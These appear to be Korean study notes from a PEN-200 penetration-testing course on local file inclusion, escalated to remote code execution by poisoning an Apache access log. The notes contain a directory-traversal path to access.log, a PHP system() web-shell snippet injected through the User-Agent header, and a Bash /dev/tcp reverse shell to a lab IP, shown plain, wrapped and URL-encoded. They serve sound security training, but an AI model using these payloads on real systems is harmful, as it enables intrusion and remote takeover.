# 9.2.1 LFI (로컬 파일 인클루전)

> **Local File Inclusion (LFI)** · PEN-200 §9.2.1

**파일 인클루전과 디렉터리 탐색을 혼동하지 말 것.** 침투 테스터와 보안 실무자가 자주 섞어 쓰는데, 취약점 종류를 잘못 판정하면 코드 실행 기회를 통째로 놓침.

- **디렉터리 탐색** — 웹 루트 밖 파일의 «내용을 읽는 것»까지임
- **파일 인클루전** — 파일을 애플리케이션의 «실행 중인 코드에 포함»시킴. 따라서 로컬·원격 파일을 «실행»할 수 있고, 실행 불가 파일이면 내용이 표시됨

같은 `admin.php` 를 지정해도 디렉터리 탐색이면 PHP 소스가 그대로 보이고, 파일 인클루전이면 그 파일이 실행됨 — 이 차이가 판정 기준임.

**로그 포이즈닝(Log Poisoning)으로 LFI 를 RCE(원격 코드 실행)로 올림.** 원리는 단순함 — 웹 애플리케이션에 보내는 데이터를 조작해 «로그에 실행 가능한 코드가 기록되게» 하고, 그 로그 파일을 LFI 로 포함시키면 안에 든 코드가 실행됨.

**착수 전에 확인할 것은 「로그에 기록되는 항목 중 내가 통제할 수 있는 것이 무엇인가」임.** 여기서 통제란 요청을 보내기 «전»에 그 값을 바꿀 수 있다는 뜻임. Apache 문서를 읽거나, 앞 절의 디렉터리 탐색으로 로그 파일 자체를 표시해 확인함.

```
kali@kali:~$ curl
http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../var/log/a
pache2/access.log
...
192.168.50.1 - - [12/Apr/2022:10:34:55 +0000] "GET /meteor/index.php?page=admin.php
HTTP/1.1" 200 2218 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101
Firefox/91.0"
...
```

*`access.log` 의 로그 항목 — User Agent 가 기록됨*

지정한 파일만 다를 뿐 요청 형태는 앞 단위의 디렉터리 탐색과 동일함. **디렉터리 탐색과 LFI 의 익스플로잇이 갈리는 지점은 실행 가능한 파일·콘텐츠를 다룰 때임.**

Burp 를 띄우고 Admin 링크를 누른 뒤 HTTP history 에서 해당 요청을 Repeater 로 보냄. 그리고 User Agent 를 아래 PHP 스니펫으로 바꿈. `cmd` 파라미터로 명령을 받아 PHP `system` 함수로 실행하고, `echo` 로 출력을 표시하는 구조임.

```
<?php echo system($_GET['cmd']); ?>
```

*User Agent 에 심을 PHP 스니펫*

![[PEN200-Fig-132.png]]
*User Agent 를 PHP 스니펫으로 교체한 Burp Repeater 요청 — 전송 시점에 `access.log` 가 오염됨*

다음으로 `page` 파라미터를 로그 파일의 상대 경로로 바꿔 그 로그를 포함시킴.

```
../../../../../../../../../var/log/apache2/access.log
```

*`page` 파라미터에 넣을 상대 경로*

같은 URL 에 `cmd` 파라미터를 추가해 명령을 전달함 — 두 파라미터를 함께 주므로 구분자로 앰퍼샌드(`&`)를 씀. ⚠️ **이때 요청에서 User Agent 줄을 지울 것.** 지우지 않으면 로그가 다시 오염돼 PHP 스니펫이 둘이 되고 명령이 중복 실행됨.

`ps` 로 동작을 확인한 뒤 `ls -la` 를 주면 **오류가 남 — 명령과 인자 사이의 공백 때문임.** 우회 방법은 두 가지임.

첫째는 IFS(Input Field Separator)로 공백 해석 방식을 바꾸는 것임. 문자열을 IFS 기준으로 쪼개 공백 문자 없이 명령을 구성함.

```
IFS=' '  # Set IFS to space
input="cat /etc/passwd"
read -r cmd arg <<< "$input"
$cmd $arg
```

*IFS 예시*

> ⚠️ **교재 예시의 한계** — 위 리스팅은 IFS 를 공백으로 «설정»해 문자열을 쪼개는 예시일 뿐, 요청에서 공백 문자를 없애는 방법 자체를 보여주지는 않음(리스팅의 `input` 값과 마지막 줄에 공백이 그대로 있음). 이 절에서 실제로 통한 우회는 아래의 URL 인코딩임.

둘째는 URL 인코딩이고, 공백은 `%20` 으로 표현됨.

![[PEN200-Fig-135.png]]
*공백을 `%20` 으로 바꾸자 인자가 붙은 명령이 정상 실행됨*

명령 실행이 되면 리버스 셸을 붙이거나 사용자의 `authorized_keys` 에 SSH 키를 넣는 쪽으로 확장함. 흔히 쓰는 Bash TCP 리버스 셸 한 줄은 아래와 같음(랩에서 대상 IP 는 바꿔야 함).

```
bash -i >& /dev/tcp/192.168.119.3/4444 0>&1
```

*Bash 리버스 셸 한 줄*

⚠️ **그대로 넣으면 실패함.** PHP `system` 함수를 거치므로 명령이 Bash 가 아니라 Bourne Shell(`sh`)로 실행될 수 있는데, 위 한 줄에는 `sh` 가 지원하지 않는 문법이 들어 있음. **`bash -c` 의 인자로 감싸 Bash 로 실행되게 할 것.**

```
bash -c "bash -i >& /dev/tcp/192.168.119.3/4444 0>&1"
```

*Bash 로 실행되도록 감싼 형태*

특수 문자는 다시 URL 인코딩함.

```
bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.119.3%2F4444%200%3E%261%22
```

*URL 인코딩한 Bash TCP 리버스 셸*

요청을 보내기 «전»에 Kali 에서 4444 포트로 Netcat 리스너를 띄워 둘 것.

*대상 시스템에서 리버스 셸 수신 성공*

**Windows 대상에서의 LFI 는 파일 경로와 코드 실행 방식만 다름.** 위 PHP 스니펫은 그대로 통함 — PHP `system` 함수가 하부 운영체제에 의존하지 않기 때문임. 다만 **로그 파일 경로가 애플리케이션마다 다름** — XAMPP 라면 Apache 로그가 `C:\xampp\apache\logs\` 에 있음.

파일 인클루전의 익스플로잇은 애플리케이션의 언어·버전·웹 서버 설정에 크게 좌우됨. PHP 외에 Perl, Active Server Pages Extended, Active Server Pages, Java Server Pages 에서도 LFI·RFI 를 악용할 수 있고 방식은 거의 같음 — JSP 애플리케이션이라면 로그 포이즈닝으로 JSP 코드를 기록해 포함시키는 식이라 **스니펫의 언어만 바뀜.**

실제 평가에서 발견되는 것은 대부분 PHP 애플리케이션임. 나머지 프레임워크·서버측 스크립트 언어는 오래돼 드물고, 현대 프레임워크·언어는 설계상 취약하지 않거나 기본 보호 기능이 켜져 있음. 다만 **Node.js 같은 현대 백엔드 JavaScript 런타임에서도 LFI 는 나올 수 있음.**
